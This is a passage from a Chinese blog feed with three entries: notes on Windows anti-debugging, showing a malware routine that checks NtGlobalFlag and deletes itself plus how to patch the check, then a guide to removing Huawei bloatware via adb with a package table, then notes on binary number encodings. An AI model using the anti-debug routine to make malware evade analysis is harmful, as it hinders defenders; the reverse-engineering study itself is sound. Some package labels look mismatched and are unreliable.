class="line">mov eax, large fs:30h   ; PEB struct loaded into EAX</span><br><span class="line">mov eax, [eax+68h]      ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX</span><br><span class="line">sub eax, 70h            ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS)</span><br><span class="line">mov [ebp+var_1828], eax</span><br><span class="line">cmp [ebp+var_1828], 0   ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged)</span><br><span class="line">jnz short loc_4035B5    ; No debugger, program continues...</span><br><span class="line">call s_selfDelete       ; ...else, malware deleted</span><br></pre></td></tr></table></figure><p>断在<code>mov eax, [eax+68h]</code>处，使用<code>CommandLine</code>插件用<code>dump fs:[30]+0x68</code>dump 出<code>NtGlobalFlag</code>的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/manually_set_peb_ntglobalflag.png" alt="Manually-set-peb-ntglobalflag.png"></p><p>右键选择<code>Binary-&gt;Fill with 00&#39;s</code>将值<code>0x70</code>替换为<code>0x00</code>即可。</p><h2 id="Heap-Flags"><a href="#Heap-Flags" class="headerlink" title="Heap Flags"></a>Heap Flags</h2><p><code>Heap flags</code>包含有两个与<code>NtGlobalFlag</code>一起初始化的标志: <code>Flags</code>和<code>ForceFlags</code>。改字段的值与调试器和Windows的版本都有关。</p><blockquote><ul><li>Flags 字段:<ul><li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>Flags</code>位于堆的<code>0x0C</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x40</code>偏移处.</li><li>在 64 位 Windows XP 中, <code>Flags</code>字段位于堆的<code>0x14</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x70</code>偏移处.</li></ul></li><li>ForceFlags 字段:<ul><li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>ForceFlags</code>位于堆的<code>0x10</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x44</code>偏移处.</li><li>在 64 位 Windows XP 中, <code>ForceFlags</code>字段位于堆的<code>0x18</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x74</code>偏移处.</li></ul></li></ul></blockquote><p>总之呢，在各种情况下会有各种的取值，具体的需要根据情况而定。</p><h2 id="The-Heap"><a href="#The-Heap" class="headerlink" title="The Heap"></a>The Heap</h2><p><a href="https://ctf-wiki.org/reverse/windows/anti-debug/the-heap/">https://ctf-wiki.org/reverse/windows/anti-debug/the-heap/</a></p><p>看不太懂，复杂，目前先不记录。</p><p>总之就是，在某些字段成立时，用特定的字段填写在堆的尾部，不知道是怎么做到的，迷惑。。</p><ul><li>如果设置了<code>HEAP_TAIL_CHECKING_ENABLED</code>标志 (见<code>Heap Flags</code>节), 那么在 32 位 windows 中就会在分配的堆块尾部附加 2 个<code>0xABABABAB</code>(64 位环境就是 4 个).</li><li>如果设置了<code>HEAP_FREE_CHECKING_ENABLED</code>(见<code>Heap Flags</code>节) 标志, 那么当需要额外的字节来填充堆块尾部时, 就会使用<code>0xFEEEFEEE</code>(或一部分) 来填充</li></ul>]]></content>
      
      
      <categories>
          
          <category> re-Note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>huawei系统软件卸载</title>
      <link href="/2022/03/04/huawei%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E5%8D%B8%E8%BD%BD/"/>
      <url>/2022/03/04/huawei%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E5%8D%B8%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="huawei系统软件卸载"><a href="#huawei系统软件卸载" class="headerlink" title="huawei系统软件卸载"></a>huawei系统软件卸载</h1><p>参考，摘抄自：<a href="http://www.usbmi.com/5700.html">http://www.usbmi.com/5700.html</a></p><p><em>正常操作的情况下，安卓手机的控制只需要单用户即可，因此卸载用户目录下的软件即可，不需要从系统目录连根拔起斩尽杀绝（这样刷机的时候还能恢复）</em></p><p><strong>第一步：</strong></p><p>手机的”设置”—“系统”—“开发人员选项”，界面下滑找到”调试”，打开“USB调试”、“连接USB时总是弹出提示”“监控ADB安装应用”、“仅充电模式下允许USB调试”这四个选项，有些不让选也影响不大。</p><p><strong>第二步：</strong></p><p>电脑下载调试工具包    ADB Kits</p><p>数据线连接电脑和手机，连接后在手机选择<code>仅充电</code></p><p>手机还会有一条连接确认，确认即可。</p><p><strong>第三步：</strong></p><p>adb命令(做打码处理)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\Desktop\Andriod\adb&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">KWG5Txxxxxx07xx5        device</span><br></pre></td></tr></table></figure><p>说明已经连接了设备，下面就可以操作了</p><p><strong>第四步：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取系统当前用户的安装列表：</span><br><span class="line">adb shell pm list packages &gt;alist.txt</span><br><span class="line">已启用的应用列表:</span><br><span class="line">adb shell pm list packages -s -e &gt;enabled.txt</span><br></pre></td></tr></table></figure><p>输出到文件方便查看。</p><p><strong>第五步：</strong></p><p>开始动手!</p><p>禁用命令格式：<code>adb shell pm disable-user 软件包名</code></p><p>启用命令格式：<code>adb shell pm enable 软件包名</code></p><p>删除命令格式：<code>adb shell pm uninstall --user 0 软件包名</code></p><p><strong>附录1，常见软件包名称对应</strong></p><p>摘抄自：<a href="http://www.8fe.com/jiaocheng/1201.html%EF%BC%88%E4%B8%AA%E4%BA%BA%E8%AE%A4%E4%B8%BA%E9%9D%9E%E5%B8%B8%E5%85%A8%E9%9D%A2%E4%BA%86%EF%BC%89">http://www.8fe.com/jiaocheng/1201.html（个人认为非常全面了）</a></p><p>直接找到相应的包名执行命令开删就可以了！</p><table><thead><tr><th align="center">包名</th><th align="center">应用名称</th></tr></thead><tbody><tr><td align="center">com.android.networkstack.inprocess</td><td align="center"></td></tr><tr><td align="center">com.android.providers.downloads</td><td align="center">下载管理器</td></tr><tr><td align="center">com.huawei.android.totemweather</td><td align="center">天气</td></tr><tr><td align="center">com.huawei.desktop.explorer</td><td align="center">我的文件</td></tr><tr><td align="center">com.huawei.arengine.service</td><td align="center">华为AR引擎</td></tr><tr><td align="center">com.google.android.overlay.settingsProvider</td><td align="center"></td></tr><tr><td align="center">com.android.soundrecorder</td><td align="center">录音机</td></tr><tr><td align="center">com.google.android.configupdater</td><td align="center"></td></tr><tr><td align="center">com.android.mms.service</td><td align="center">短信服务</td></tr><tr><td align="center">com.android.companiondevicemanager</td><td align="center"></td></tr><tr><td align="center">com.huawei.imedia.dolby</td><td align="center">杜比音效</td></tr><tr><td align="center">com.google.android.ext.shared</td><td align="center"></td></tr><tr><td align="center">com.google.android.onetimeinitializer</td><td align="center">谷歌one time</td></tr><tr><td align="center">com.huawei.desktop.systemui</td><td align="center"></td></tr><tr><td align="center">com.huawei.multimedia.audioengine</td><td align="center"></td></tr><tr><td align="center">com.huawei.numberidentity</td><td align="center"></td></tr><tr><td align="center">com.huawei.KoBackup</td><td align="center">备份</td></tr><tr><td align="center">com.google.ar.core</td><td align="center">谷歌AR服务</td></tr><tr><td align="center">com.android.nfc</td><td align="center">NFC服务</td></tr><tr><td align="center">com.android.mms</td><td align="center">信息</td></tr><tr><td align="center">com.huawei.systemserver</td><td align="center">系统服务</td></tr><tr><td align="center">com.android.ons</td><td align="center"></td></tr><tr><td align="center">com.huawei.himovie.partner1</td><td align="center"></td></tr><tr><td align="center">com.huawei.cloud</td><td align="center">华为云</td></tr><tr><td align="center">com.huawei.profile</td><td align="center">华为Profile</td></tr><tr><td align="center">com.huawei.himovie.partner2</td><td align="center"></td></tr><tr><td align="center">com.android.contacts</td><td align="center">联系人</td></tr><tr><td align="center">com.android.systemui.overlay</td><td align="center"></td></tr><tr><td align="center">com.android.simappdialog</td><td align="center"></td></tr><tr><td align="center">com.android.vending</td><td align="center">Google Play商店</td></tr><tr><td align="center">com.android.frameworkhwext.honor</td><td align="center"></td></tr><tr><td align="center">com.huawei.wallet.sdk.walletsdk</td><td align="center"></td></tr><tr><td align="center">com.android.modulemetadata</td><td align="center"></td></tr><tr><td align="center">com.android.providers.media</td><td align="center">媒体存储</td></tr><tr><td align="center">com.huawei.bluetooth</td><td align="center">通过蓝牙导入</td></tr><tr><td align="center">com.android.email</td><td align="center">电子邮件</td></tr><tr><td align="center">com.android.providers.blockednumber</td><td align="center">存储已屏蔽的号码</td></tr><tr><td align="center">com.android.wallpaperbackup</td><td align="center">壁纸备份</td></tr><tr><td align="center">com.Qunar</td><td align="center">去哪儿</td></tr><tr><td align="center">com.google.android.gsf.login</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.android.mirrorshare</td><td align="center">无线分享</td></tr><tr><td align="center">com.svox.pico</td><td align="center">Pico TTS</td></tr><tr><td align="center">com.android.packageinstaller</td><td align="center">打包安装程序</td></tr><tr><td align="center">com.android.frameworkhwext.overlay.dark</td><td align="center">安卓框架</td></tr><tr><td align="center">com.google.android.printservice.readb</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.android.hwpay</td><td align="center">华为钱包安全支付</td></tr><tr><td align="center">com.android.imedia.syncplay</td><td align="center"></td></tr><tr><td align="center">com.android.providers.userdictionary</td><td align="center">用户词典</td></tr><tr><td align="center">com.android.providers.telephony</td><td align="center">通话/信息存储</td></tr><tr><td align="center">com.huawei.android.launcher</td><td align="center">华为桌面</td></tr><tr><td align="center">com.huawei.camerakit.impl</td><td align="center"></td></tr><tr><td align="center">com.huawei.androidx</td><td align="center">AndroidX</td></tr><tr><td align="center">com.android.phone.recorder</td><td align="center">录音机</td></tr><tr><td align="center">com.huawei.hidisk</td><td align="center">文件管理</td></tr><tr><td align="center">com.huawei.featurelayer.featureframework</td><td align="center"></td></tr><tr><td align="center">com.android.providers.calendar</td><td align="center">日历存储</td></tr><tr><td align="center">com.huawei.android.tips</td><td align="center"></td></tr><tr><td align="center">com.huawei.camera</td><td align="center">相机</td></tr><tr><td align="center">com.android.exchange</td><td align="center">Exchange服务</td></tr><tr><td align="center">com.baidu.haokan</td><td align="center">好看视频</td></tr><tr><td align="center">com.smile.gifmaker</td><td align="center">gif制造商</td></tr><tr><td align="center">com.huawei.hiskytone</td><td align="center">天际通</td></tr><tr><td align="center">com.huawei.nlp</td><td align="center"></td></tr><tr><td align="center">cn.wps.moffice_eng</td><td align="center">WPS</td></tr><tr><td align="center">com.android.hwmirror</td><td align="center">镜子</td></tr><tr><td align="center">com.huawei.dmsdp</td><td align="center"></td></tr><tr><td align="center">com.huawei.hicar</td><td align="center">华为汽车</td></tr><tr><td align="center">com.huawei.hiboard</td><td align="center">负一屏</td></tr><tr><td align="center">com.huawei.ihealth</td><td align="center">华为健康</td></tr><tr><td align="center">com.huawei.yellowpage</td><td align="center">在线黄页</td></tr><tr><td align="center">com.huawei.internetaudioservice</td><td align="center">智能线控</td></tr><tr><td align="center">com.huawei.livewallpaper.matewenty</td><td align="center">华山</td></tr><tr><td align="center">com.google.android.backuptransport</td><td align="center">谷歌备份传输</td></tr><tr><td align="center">com.huawei.android.thememan</td><td align="center">主题</td></tr><tr><td align="center">com.ifytek.speechsuite</td><td align="center">讯飞语音引擎</td></tr><tr><td align="center">com.android.inputmethod.latin</td><td align="center">AOSP输入法</td></tr><tr><td align="center">com.android.providers.contacts</td><td align="center">联系人存储</td></tr><tr><td align="center">com.android.permissioncontroller</td><td align="center">安卓权限控制</td></tr><tr><td align="center">com.huawei.assetsync</td><td align="center"></td></tr><tr><td align="center">com.android.systemui</td><td align="center">系统界面</td></tr><tr><td align="center">com.huawei.hwvoipservice</td><td align="center"></td></tr><tr><td align="center">com.huawei.assetsyncservice</td><td align="center"></td></tr><tr><td align="center">com.android.bluetooth</td><td align="center">蓝牙</td></tr><tr><td align="center">com.huawei.hff</td><td align="center">hff服务</td></tr><tr><td align="center">com.huawei.aod</td><td align="center">灭屏显示</td></tr><tr><td align="center">com.android.vebding</td><td align="center">谷歌play商店</td></tr><tr><td align="center">com.andeoid.wallpaper.livepicker</td><td align="center">稻穗屏保</td></tr><tr><td align="center">com.szzc.ucar.pilot</td><td align="center">神州租车</td></tr><tr><td align="center">com.amap.android.ams</td><td align="center">高德位置服务</td></tr><tr><td align="center">com.huawei.remoteassistant</td><td align="center">远程协助</td></tr><tr><td align="center">com.autonavi.minimap</td><td align="center">高德地图</td></tr><tr><td align="center">ctrip.android.view</td><td align="center">携程旅行</td></tr><tr><td align="center">com.huawei.retaildemo</td><td align="center">演示程序</td></tr><tr><td align="center">com.huawei.android.location.activityrecognition</td><td align="center">行为识别</td></tr><tr><td align="center">com.huawei.geofence</td><td align="center">地理围栏</td></tr><tr><td align="center">com.stupeflix.replay</td><td align="center">Quik</td></tr><tr><td align="center">com.ifeng.news2</td><td align="center">凤凰新闻</td></tr><tr><td align="center">com.nuance.swype.emui</td><td align="center">华为Swype输入法</td></tr><tr><td align="center">com.dianping.v1</td><td align="center">大众点评</td></tr><tr><td align="center">com.google.android.ext.services</td><td align="center">android Services Library</td></tr><tr><td align="center">com.huawei.locationsharing</td><td align="center">位置共享</td></tr><tr><td align="center">com.huawei.cryptosms.service</td><td align="center">短信加密</td></tr><tr><td align="center">com.android.defcontainer</td><td align="center">软件包访问帮助程序</td></tr><tr><td align="center">com.realvnc.android.remote</td><td align="center">VNC远程控制</td></tr><tr><td align="center">com.android.deskclock</td><td align="center">时钟</td></tr><tr><td align="center">com.android.location.fused</td><td align="center">融合定位</td></tr><tr><td align="center">com.google.android.syncadapters.contacts</td><td align="center"></td></tr><tr><td align="center">com.android.server.telecom</td><td align="center">通话管理</td></tr><tr><td align="center">com.google.android.webview</td><td align="center">安卓内置浏览器</td></tr><tr><td align="center">com.android.gallery3d</td><td align="center">图库</td></tr><tr><td align="center">android.ext.services</td><td align="center"></td></tr><tr><td align="center">com.google.android.gsf</td><td align="center">谷歌服务框架</td></tr><tr><td align="center">com.google.android.gms</td><td align="center">谷歌play服务</td></tr><tr><td align="center">com.google.android.overlay.gmsconfig</td><td align="center"></td></tr><tr><td align="center">androidx.camera.extensions.impl</td><td align="center"></td></tr><tr><td align="center">com.android.providers.settings</td><td align="center"></td></tr><tr><td align="center">com.huawei.livewallpaper.matetwenty</td><td align="center"></td></tr><tr><td align="center">com.android.calendar</td><td align="center">日历</td></tr><tr><td align="center">com.android.incallui</td><td align="center">拨号</td></tr><tr><td align="center">com.huawei.systemmanager</td><td align="center">手机管家</td></tr><tr><td align="center">com.huawei.securityserver</td><td align="center"></td></tr><tr><td align="center">com.android.se</td><td align="center"></td></tr><tr><td align="center">com.google.android.partnersetup</td><td align="center">谷歌合作伙伴设置</td></tr><tr><td align="center">com.android.localtransport</td><td align="center"></td></tr><tr><td align="center">com.android.calculator2</td><td align="center">计算器</td></tr><tr><td align="center">com.huawei.deviceauth</td><td align="center"></td></tr><tr><td align="center">com.android.networkstack.permissionconfig</td><td align="center"></td></tr><tr><td align="center">com.huawei.android.remotecontroller</td><td align="center">华为智能遥控</td></tr><tr><td align="center">com.huawei.android.hwupgradeguide</td><td align="center">升级向导</td></tr><tr><td align="center">com.android.huawei.HiMediaEngine</td><td align="center">定制多媒体引擎</td></tr><tr><td align="center">com.android.shell</td><td align="center"></td></tr><tr><td align="center">com.android.phone</td><td align="center">拨号</td></tr><tr><td align="center">com.android.settings</td><td align="center"></td></tr><tr><td align="center">com.qeexo.smartshot</td><td align="center">智能截屏</td></tr><tr><td align="center">com.huawei.vrservice</td><td align="center">华为VR眼镜服务</td></tr><tr><td align="center">com.huawei.compass</td><td align="center">指南针</td></tr><tr><td align="center">com.google.android.printservice.recommendation</td><td align="center"></td></tr><tr><td align="center">com.huawei.android.dsdscardmanager</td><td align="center">双卡管理</td></tr><tr><td align="center">com.tencent.qqlivehuawei</td><td align="center">腾讯视频华为版</td></tr><tr><td align="center">com.huawei.powergenie</td><td align="center">省电精灵</td></tr><tr><td align="center">com.android.apps.tag</td><td align="center">标记</td></tr><tr><td align="center">com.huawei.watch.sync</td><td align="center">手表应用同步</td></tr><tr><td align="center">com.ss.android.ugc.aweme</td><td align="center">抖音短视频</td></tr><tr><td align="center">com.huawei.mmitest</td><td align="center">华为测试组件</td></tr><tr><td align="center">com.android.wallpaper.livepicker</td><td align="center">动态壁纸</td></tr><tr><td align="center">com.huawei.android.wfdft</td><td align="center">WLAN直连</td></tr><tr><td align="center">com.huawei.android.instantonline</td><td align="center">华为一键热点应用</td></tr><tr><td align="center">com.huawei.android.projectmenu</td><td align="center">工程菜单</td></tr><tr><td align="center">com.android.vpndialogs</td><td align="center">VPN设置</td></tr><tr><td align="center">com.huawei.android.pushagent</td><td align="center">推送服务</td></tr><tr><td align="center">com.android.cts.ctsshim</td><td align="center">旅行助手</td></tr><tr><td align="center">com.android.dreams.phototable</td><td align="center">图片屏保程序</td></tr><tr><td align="center">com.huawei.hitouch</td><td align="center">Hi Touch功能</td></tr><tr><td align="center">com.huawei.vassistant</td><td align="center">语音助手</td></tr><tr><td align="center">com.android.onetimeinitializer</td><td align="center">一次性</td></tr><tr><td align="center">com.huawei.hilink.framework</td><td align="center">智能家居连接服务</td></tr><tr><td align="center">com.huawei.hwstartupguide</td><td align="center">安装向导</td></tr><tr><td align="center">com.android.calllogbackup</td><td align="center">通讯录备份</td></tr><tr><td align="center">com.android.managedprovisioning</td><td align="center">工作资料设置</td></tr><tr><td align="center">com.android.proxyhandler</td><td align="center">处理器信息</td></tr><tr><td align="center">com.huawei.fido.uafclient</td><td align="center">在线快速验证</td></tr><tr><td align="center">com.android.emergency</td><td align="center">个人紧急信息</td></tr><tr><td align="center">com.huawei.ims</td><td align="center">华为云镜像服务</td></tr><tr><td align="center">com.huawei.hwpolicyservice</td><td align="center">华为旅行助手服务管理</td></tr><tr><td align="center">com.huawei.hwapplet</td><td align="center">旅行助手策略管理</td></tr><tr><td align="center">com.huawei.hicard</td><td align="center">卡片管理</td></tr><tr><td align="center">com.huawei.hiview</td><td align="center">状态栏通知有关</td></tr><tr><td align="center">com.huawei.trustspace</td><td align="center">支付保护中心</td></tr><tr><td align="center">com.huawei.spaceservice</td><td align="center">云空间</td></tr><tr><td align="center">com.huawei.fastapp</td><td align="center">快应用中心</td></tr><tr><td align="center">com.huawei.hisuite</td><td align="center">华为手机助手</td></tr><tr><td align="center">com.android.captiveportallogin</td><td align="center">Captive Portal Login</td></tr><tr><td align="center">com.huawei.bd</td><td align="center">用户体验计划</td></tr><tr><td align="center">com.huawei.hwdetectrepair</td><td align="center">智能检测</td></tr><tr><td align="center">com.android.bluetoothmidiservice</td><td align="center">蓝牙模组</td></tr><tr><td align="center">com.huawei.ca</td><td align="center">ca服务</td></tr><tr><td align="center">com.huawei.android.karaoke</td><td align="center">K歌特效</td></tr><tr><td align="center">com.huawei.rcsserviceapplication</td><td align="center">华为rcs服务</td></tr><tr><td align="center">com.huawei.hiaction</td><td align="center">智能识屏中控模块</td></tr><tr><td align="center">com.android.inputdevices</td><td align="center">输入设备</td></tr><tr><td align="center">com.android.frameworkres.overlay</td><td align="center"></td></tr><tr><td align="center">com.android.externalstorage</td><td align="center">外部存储设备</td></tr><tr><td align="center">com.android.documentsui</td><td align="center">文件</td></tr><tr><td align="center">com.huawei.secime</td><td align="center">华为安全输入法</td></tr><tr><td align="center">com.android.htmlviewer</td><td align="center">HTML查看器</td></tr><tr><td align="center">com.huawei.regservice</td><td align="center">注册服务</td></tr><tr><td align="center">com.huawei.trustcircle</td><td align="center">支付保护中心</td></tr><tr><td align="center">com.huawei.wallet</td><td align="center">华为钱包</td></tr><tr><td align="center">com.iflytek.speechsuite</td><td align="center">讯飞语音引擎</td></tr><tr><td align="center">com.huawei.parentcontrol</td><td align="center">学生模式</td></tr><tr><td align="center">com.huawei.recsys</td><td align="center">华为智能系统还原</td></tr><tr><td align="center">com.huawei.iaware</td><td align="center">智能优化</td></tr><tr><td align="center">com.huawei.android.UEInfoCheck</td><td align="center">自注册短信</td></tr><tr><td align="center">com.huawei.synergy</td><td align="center">输入设备</td></tr><tr><td align="center">com.huawei.android.chr</td><td align="center">HwChrService</td></tr><tr><td align="center">com.android.wallpapercropper</td><td align="center">壁纸裁剪器</td></tr><tr><td align="center">com.huawei.intelligent</td><td align="center">情景智能</td></tr><tr><td align="center">com.huawei.android.FloatTasks</td><td align="center">悬浮导航</td></tr><tr><td align="center">com.huawei.nearby</td><td align="center">华为附近</td></tr><tr><td align="center">com.huawei.phoneservice</td><td align="center">会员服务</td></tr><tr><td align="center">com.huawei.iconnect</td><td align="center">智能家居连接</td></tr><tr><td align="center">com.android.statementservice</td><td align="center">Intent Filter Verification Services</td></tr><tr><td align="center">com.huawei.trustagent</td><td align="center">智能解锁</td></tr><tr><td align="center">com.huawei.android.instantshare</td><td align="center">Huawei Share</td></tr><tr><td align="center">com.huawei.android.internal.app</td><td align="center">Huawei Share</td></tr><tr><td align="center">com.huawei.hwasm</td><td align="center"></td></tr><tr><td align="center">com.android.printspooler</td><td align="center">打印处理服务</td></tr><tr><td align="center">com.android.sharedstoragebackup</td><td align="center"></td></tr><tr><td align="center">com.huawei.wifiprobqeservice</td><td align="center">WiFi服务</td></tr><tr><td align="center">com.android.backupconfirm</td><td align="center">第三方的应用程序</td></tr><tr><td align="center">com.android.stk</td><td align="center">sim应用</td></tr><tr><td align="center">com.android.pacprocessor</td><td align="center">电脑连接辅助</td></tr><tr><td align="center">com.huawei.hiviewtunnel</td><td align="center">电量优化</td></tr><tr><td align="center">com.huawei.android.AutoRegSms</td><td align="center">自动注册</td></tr><tr><td align="center">com.android.frameworkhwext.HONOR</td><td align="center">荣耀框架</td></tr><tr><td align="center">com.android.certinstaller</td><td align="center">证书安装器</td></tr><tr><td align="center">com.android.mtp</td><td align="center">MTP服务</td></tr><tr><td align="center">com.android.frameworkhwext.dark</td><td align="center"></td></tr><tr><td align="center">com.huawei.printservice</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.featurelayer.sharedfeature.map</td><td align="center">华为地图服务</td></tr><tr><td align="center">com.huawei.motionservice</td><td align="center">手势服务</td></tr><tr><td align="center">com.sankuai.meituan</td><td align="center">美团</td></tr><tr><td align="center">com.huawei.health</td><td align="center">运动健康</td></tr><tr><td align="center">org.simalliance.openmobileapi.service</td><td align="center">SmartcardService</td></tr><tr><td align="center">com.huawei.hnreader</td><td align="center">荣耀阅读</td></tr><tr><td align="center">com.huawei.vdrive</td><td align="center">驾驶模式</td></tr><tr><td align="center">companiondevicemanager</td><td align="center">系统状态栏</td></tr><tr><td align="center">com.huawei.android.FMRadio</td><td align="center">收音机</td></tr><tr><td align="center">com.android.dreams.basic</td><td align="center">基本互动屏保</td></tr><tr><td align="center">com.huawei.tips</td><td align="center">智能提醒</td></tr><tr><td align="center">com.huawei.gameassistant</td><td align="center">游戏助手</td></tr><tr><td align="center">com.android.storagemanager</td><td align="center">存储设备管理</td></tr><tr><td align="center">com.huawei.scanner</td><td align="center">扫一扫</td></tr><tr><td align="center">com.huawei.mycenter</td><td align="center">会员中心</td></tr><tr><td align="center">com.huawei.contactscamcard</td><td align="center">名片全能王</td></tr><tr><td align="center">com.huawei.hwireader</td><td align="center">华为阅读</td></tr><tr><td align="center">com.android.browser</td><td align="center">浏览器</td></tr><tr><td align="center">com.huawei.hwvplayer.youku</td><td align="center">华为视频优酷版</td></tr><tr><td align="center">com.taobao.mobile.dipei</td><td align="center"></td></tr><tr><td align="center">com.hicloud.android.clone</td><td align="center">手机克隆</td></tr><tr><td align="center">com.xunmeng.pinduoduo</td><td align="center">拼多多</td></tr><tr><td align="center">com.huawei.HwMultiScreenShot</td><td align="center">滚动截屏</td></tr><tr><td align="center">com.ss.android.article.news</td><td align="center">今日头条</td></tr><tr><td align="center">com.UCMobile</td><td align="center">UC浏览器</td></tr><tr><td align="center">com.android.keychain</td><td align="center">密钥链</td></tr><tr><td align="center">com.example.android.notepad</td><td align="center">备忘录</td></tr><tr><td align="center">com.huawei.nb.service</td><td align="center">可删可禁用</td></tr><tr><td align="center">com.huawei.lives</td><td align="center">生活</td></tr><tr><td align="center">com.google.android.marvin.talkback</td><td align="center">TalkBack</td></tr><tr><td align="center">com.android.carrierconfig</td><td align="center">运营商配置</td></tr><tr><td align="center">com.android.systEMUI.overlay</td><td align="center">主题界面</td></tr><tr><td align="center">com.huawei.fans</td><td align="center">花粉俱乐部</td></tr><tr><td align="center">com.baidu.searchbox</td><td align="center">百度搜素</td></tr><tr><td align="center">com.huawei.gamebox</td><td align="center">华为游戏中心</td></tr><tr><td align="center">com.wuba</td><td align="center">58同城</td></tr><tr><td align="center">com.unionpay.tsmservice</td><td align="center">tsm服务</td></tr><tr><td align="center">com.huawei.hifolder</td><td align="center">精品推荐</td></tr><tr><td align="center">com.huawei.screenrecorder</td><td align="center">屏幕录制</td></tr><tr><td align="center">com.huawei.browser</td><td align="center">浏览器</td></tr><tr><td align="center">com.android.mediacenter</td><td align="center">音乐</td></tr><tr><td align="center">com.huawei.android.hiaidsengine</td><td align="center">屏幕录制</td></tr><tr><td align="center">com.huawei.contentsensor</td><td align="center">取词</td></tr><tr><td align="center">com.huawei.msdp</td><td align="center">综合传感信息处理平台</td></tr><tr><td align="center">com.huawei.suggestion</td><td align="center">情景智能</td></tr><tr><td align="center">com.huawei.search</td><td align="center">智慧搜索</td></tr><tr><td align="center">com.huawei.himovie</td><td align="center">华为视频</td></tr><tr><td align="center">com.huawei.android.findmyphone</td><td align="center">查找我的手机</td></tr><tr><td align="center">com.huawei.android.airsharing</td><td align="center">多屏互动</td></tr><tr><td align="center">com.huawei.skytone</td><td align="center">天际通数据服务</td></tr><tr><td align="center">com.huawei.hbs.framework</td><td align="center"></td></tr><tr><td align="center">com.huawei.lbs</td><td align="center">HwLBSService</td></tr><tr><td align="center">com.huawei.smartlocation</td><td align="center"></td></tr><tr><td align="center">com.huawei.appmarket</td><td align="center">华为应用市场</td></tr><tr><td align="center">com.huawei.android.hwouc</td><td align="center">系统更新</td></tr><tr><td align="center">com.huawei.pengine</td><td align="center">智能建议</td></tr><tr><td align="center">com.huawei.videoeditor</td><td align="center">视频编辑</td></tr><tr><td align="center">com.huawei.contacts.sync</td><td align="center">联系人同步</td></tr><tr><td align="center">com.android.frameworkhwext.nova</td><td align="center">更换主题</td></tr><tr><td align="center">com.huawei.android.thememanager</td><td align="center">主题</td></tr><tr><td align="center">com.bjbyhd.screenreader_huawei</td><td align="center">屏幕阅读</td></tr><tr><td align="center">com.huawei.android.hwaps</td><td align="center">智能分辨率</td></tr><tr><td align="center">com.huawei.scenepack</td><td align="center">华为旅行助手</td></tr><tr><td align="center">com.android.printservice.recommendation</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.pcassistant</td><td align="center">电脑端工具</td></tr><tr><td align="center">com.android.keyguard</td><td align="center">华为杂志锁屏</td></tr><tr><td align="center">com.android.providers.downloads.ui</td><td align="center">下载内容</td></tr><tr><td align="center">com.huawei.hiai</td><td align="center">智慧引擎</td></tr><tr><td align="center">com.huawei.languagedownloader</td><td align="center">下载语言</td></tr><tr><td align="center">com.huawei.securitymgr</td><td align="center">隐私空间</td></tr><tr><td align="center">com.huawei.imedia.sws</td><td align="center">音效管理</td></tr><tr><td align="center">com.huawei.android.hsf</td><td align="center">华为框架服务</td></tr><tr><td align="center">com.baidu.input_huawei</td><td align="center">百度输入法华为版</td></tr><tr><td align="center">com.huawei.hwid</td><td align="center">华为移动服务</td></tr><tr><td align="center">com.android.cts.priv.ctsshim</td><td align="center">旅行助手</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器码总结</title>
      <link href="/2022/03/03/%E6%9C%BA%E5%99%A8%E7%A0%81%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/03/%E6%9C%BA%E5%99%A8%E7%A0%81%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="机器码总结"><a href="#机器码总结" class="headerlink" title="机器码总结"></a>机器码总结</h1><p>摘抄自：<a href="https://www.cnblogs.com/liushuijinger/archive/2012/04/05/2433718.html">https://www.cnblogs.com/liushuijinger/archive/2012/04/05/2433718.html</a></p><p><strong>原码：</strong></p><p>如果机器字长为n，那么一个数的原码就是用一个n位的二进制数，其中最高位为符号位：正数为0，负数为1。剩下的n-1位表示概数的绝对值。</p><p>例如： X=+101011 , [X]原= 00101011   X=-101011 , [X]原= 10101011 </p><p>位数不够的用0补全。</p><p>PS：正数的原、反、补码都一样。</p><p><strong>反码：</strong></p><p>知道了什么是原码，那反码就更是张飞吃豆芽——小菜一碟了。知道了原码，那么你只需要具备区分0跟1的能力就可以轻松求出反码，为什么呢？因为反码就是在原码的基础上，符号位不变其他位按位取反(就是0变1，1变0)就可以了。</p><p>例如：X=-101011 , [X]原= 10101011 ，[X]反=11010100</p><p><strong>补码：</strong></p><p>补码也非常的简单就是在反码的基础上按照正常的加法运算加1。</p><p>例如：X=-101011 , [X]原= 10101011 ，[X]反=11010100，[X]补=11010101</p><p><strong>移码：</strong></p><p>移码最简单了，不管正负数，只要将其补码的符号位取反即可。</p><p>例如：X=-101011 , [X]原= 10101011 ，[X]反=11010100，[X]补=11010101，[X]移=01010101</p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
